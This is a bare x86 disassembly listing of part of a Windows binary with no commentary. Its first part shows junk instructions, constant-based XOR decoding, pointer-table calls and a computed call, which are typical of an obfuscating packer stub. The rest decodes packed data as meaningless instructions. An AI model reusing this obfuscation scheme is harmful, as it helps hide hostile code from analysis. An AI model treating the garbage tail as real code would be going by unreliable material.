  40b1a4:	jne    0x40b1b6
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d45c
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff0e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d45c
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d4e0
  40b34b:	mov    esi,DWORD PTR ds:0x41d4d8
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d4d8,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d4d8
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d4d8
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d4d8
  40b3aa:	mov    ds:0x41d4e0,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ff61
  40b3fa:	push   0x41ff4b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d45c
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d568
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d27c
  40b4c0:	mov    esi,DWORD PTR ds:0x41d298
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x41ffef
  40b51b:	mov    esi,DWORD PTR ds:0x41d294
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x41ffd7
  40b559:	mov    ecx,DWORD PTR ds:0x41d260
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d2d8
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d534
  40b774:	push   DWORD PTR ds:0x41d2e0
  40b77a:	push   DWORD PTR ds:0x41d514
  40b780:	push   DWORD PTR ds:0x41d588
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d4d8
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d2d4
  40b812:	mov    edx,DWORD PTR ds:0x41d260
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d45c
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d2ac
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xba3cf201
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx+0x42]
  40bac3:	mov    cl,0x60
  40bac5:	dec    ebx
  40bac6:	sar    DWORD PTR [eax],1
  40bac8:	inc    ebp
  40bac9:	stos   BYTE PTR es:[edi],al
  40baca:	mov    BYTE PTR [ebx-0x44ae71aa],ch
  40bad0:	out    dx,al
  40bad1:	out    0x95,al
  40bad3:	inc    esp
  40bad4:	mov    esp,0x998835f6
  40bad9:	push   eax
  40bada:	pop    eax
  40badb:	adc    cl,dl
  40badd:	mov    dh,BYTE PTR [edi-0x16]
  40bae0:	jo     0x40ba7d
  40bae2:	call   0x6b744704
  40bae7:	sbb    cl,dl
  40bae9:	gs sub eax,0x399c75e2
  40baef:	iret   
  40baf0:	pop    esi
  40baf1:	in     eax,0xa6
  40baf3:	xor    al,0x78
  40baf5:	mov    DWORD PTR [ebp+ebx*2-0x39cbe8e0],edi
  40bafc:	lds    ebp,FWORD PTR [eax]
  40bafe:	dec    esi
  40baff:	mov    ebx,0xe6650cd2
  40bb04:	jp     0x40ba93
  40bb06:	mov    edx,DWORD PTR [di-0x6497]
  40bb0b:	dec    esi
  40bb0c:	aas    
  40bb0d:	jo     0x40bb77
  40bb0f:	inc    ebp
  40bb10:	jns    0x40bb0c
  40bb12:	and    ch,BYTE PTR [ecx-0x40]
  40bb15:	and    al,0xb7
  40bb17:	pop    es
  40bb18:	pop    edi
  40bb19:	in     al,0x72
  40bb1b:	aad    0x8
  40bb1d:	dec    ebp
  40bb1e:	mov    ah,0xe3
  40bb20:	nop
  40bb21:	pop    ebx
  40bb22:	cmp    bh,BYTE PTR [ebp+0x7cd5a43d]
  40bb28:	push   esi
  40bb29:	adc    ebx,DWORD PTR [edi+0x11]
  40bb2c:	push   ds
  40bb2d:	inc    ebx
  40bb2e:	push   esi
  40bb2f:	(bad)  
  40bb30:	dec    ebp
  40bb31:	dec    ebx
  40bb32:	inc    ecx
  40bb33:	popf   
  40bb34:	dec    edx
  40bb35:	mov    ebx,0xf53a0f46
  40bb3a:	sbb    esi,DWORD PTR [edx+0x39fedd4d]
  40bb40:	clc    
  40bb41:	xchg   ebx,eax
  40bb42:	test   al,0x71
  40bb45:	shl    esp,0x1a
  40bb48:	adc    DWORD PTR [eax],esp
  40bb4a:	dec    ebx
  40bb4b:	lahf   
  40bb4c:	pushf  
  40bb4d:	pop    esp
  40bb4e:	xor    al,0x3e
  40bb50:	mov    eax,0x181b02b6
  40bb55:	mov    eax,ds:0x1068f222
  40bb5a:	rol    ebp,0xd8
  40bb5d:	jns    0x40bb62
  40bb5f:	sub    bh,BYTE PTR [ebp+0x23]
  40bb62:	jge    0x40bbd0
  40bb64:	adc    eax,0x10552418
  40bb69:	data16 add BYTE PTR [edx],bh
  40bb6c:	dec    edx
  40bb6d:	lea    esp,[eax+eiz*8+0x25]
  40bb71:	xchg   DWORD PTR [edx+0x9],edi
  40bb74:	leave  
  40bb75:	mov    cl,0xfb
  40bb77:	xor    ah,BYTE PTR [ebp-0x33]
  40bb7a:	add    edx,DWORD PTR [esi]
  40bb7c:	sahf   
  40bb7d:	mov    bl,0xc
  40bb7f:	adc    al,0xd1
  40bb81:	repz sbb ebx,ebx
  40bb84:	dec    edi
  40bb85:	jnp    0x40bb14
  40bb87:	inc    ebx
  40bb88:	pop    ecx
  40bb89:	or     eax,0xd24b60fd
  40bb8e:	imul   edx,ebx,0xd35b2c5f
  40bb94:	shr    DWORD PTR [edi-0x1d7c09d1],1
  40bb9a:	cdq    
  40bb9b:	mov    bl,0xa7
  40bb9d:	fist   WORD PTR [edi+0x47]
  40bba0:	(bad)  
  40bba1:	(bad)  
  40bba2:	sbb    DWORD PTR [ebx],esi
  40bba4:	inc    ebx
  40bba5:	jg     0x40bc16
  40bba7:	or     eax,DWORD PTR [ebx+0x69]
  40bbaa:	(bad)  
  40bbab:	(bad)  
  40bbac:	out    dx,al
  40bbad:	(bad)  
  40bbae:	sbb    esp,DWORD PTR [eax]
  40bbb0:	ficom  WORD PTR [ebx+0x19]
  40bbb3:	cwde   
  40bbb4:	sub    al,0xf4
  40bbb6:	and    DWORD PTR [edi-0xe7cf002],0x6a
  40bbbd:	cmp    bl,BYTE PTR [esi+0x4e85af77]
  40bbc3:	sbb    BYTE PTR [ebp-0x5e],al
  40bbc6:	push   esp
  40bbc7:	aad    0xc5
  40bbc9:	mov    esp,0x55bb2e00
  40bbce:	dec    edi
  40bbcf:	nop
  40bbd0:	mov    ebx,0xc1c05611
  40bbd5:	pop    ebx
  40bbd6:	jmp    0x50d75a0f
  40bbdb:	fldenv [edx+0x24]
  40bbde:	cmp    edi,DWORD PTR [eax+eiz*1-0x6f9edd77]
  40bbe5:	loopne 0x40bbfe
  40bbe7:	adc    esp,edi
  40bbe9:	add    al,0x6b
  40bbeb:	or     BYTE PTR [ebp-0x2c],al
  40bbee:	dec    edi
  40bbef:	adc    eax,0x8e761c92
  40bbf4:	daa    
  40bbf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbf6:	add    edx,DWORD PTR [esi+0x5c30f2c9]
  40bbfc:	cmp    bl,BYTE PTR [ecx-0x13]
  40bbff:	push   ecx
  40bc00:	sub    DWORD PTR [esi+0x211b21d2],esi
  40bc06:	cmp    dl,ah
  40bc08:	mov    al,0xb7
  40bc0a:	add    dh,BYTE PTR [ebx+eiz*4-0x5f]
  40bc0e:	adc    eax,edx
  40bc10:	push   ecx
  40bc11:	sar    bh,1
